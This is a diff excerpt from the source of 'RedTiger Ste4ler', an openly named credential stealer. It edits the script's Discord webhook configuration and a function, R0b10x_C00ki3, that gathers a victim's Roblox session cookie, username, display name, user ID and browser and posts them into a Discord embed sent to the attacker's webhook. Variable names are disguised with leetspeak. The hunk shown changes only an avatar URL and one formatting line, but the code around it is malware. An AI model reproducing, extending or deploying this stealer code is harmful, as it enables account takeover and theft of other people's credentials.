@@ -52,7 +52,7 @@ w3bh00k_ur1 = "%WEBHOOK_URL%"
 website = "redtiger.shop"
 color_embed = 0xa80505
 username_embed = 'RedTiger Ste4ler'
-avatar_embed = 'https://cdn.discordapp.com/attachments/1268900329605300234/1273392191234113679/RedTiger-Logo.png?ex=66be7264&is=66bd20e4&hm=1165a5cd1fd68f410e80c07ca00b0e3db24f008251c838d3d0d695d2e777c6bd&'
+avatar_embed = 'https://cdn.discordapp.com/attachments/1268900329605300234/1276010081665683497/RedTiger-Logo.png?ex=66cf38be&is=66cde73e&hm=696c53b4791044ca0495d87f92e6d603e8383315d2ebdd385aaccfc6dbf6aa77&'
 footer_text = "RedTiger Ste4ler | https://github.com/loxyteck/RedTiger-Tools"
 footer_embed = {
         "text": footer_text,
@@ -925,7 +925,7 @@ def R0b10x_C00ki3():
                 )
                 embed.set_footer(text=footer_text, icon_url=avatar_embed)
                 embed.set_thumbnail(url=av4t4r_r0b10x)
-                embed.add_field(name=":compass: Navigator:", value=f"```{n4vigator.replace("_", " ")}```", inline=True)
+                embed.add_field(name=":compass: Navigator:", value=f"```{n4vigator}```", inline=True)
                 embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{us3rn4m3_r0b10x}```", inline=True)
                 embed.add_field(name=":bust_in_silhouette: DisplayName:", value=f"```{d1spl4y_nam3_r0b10x}```", inline=True)
                 embed.add_field(name=":robot: Id:", value=f"```{us3r_1d_r0b10x}```", inline=True)
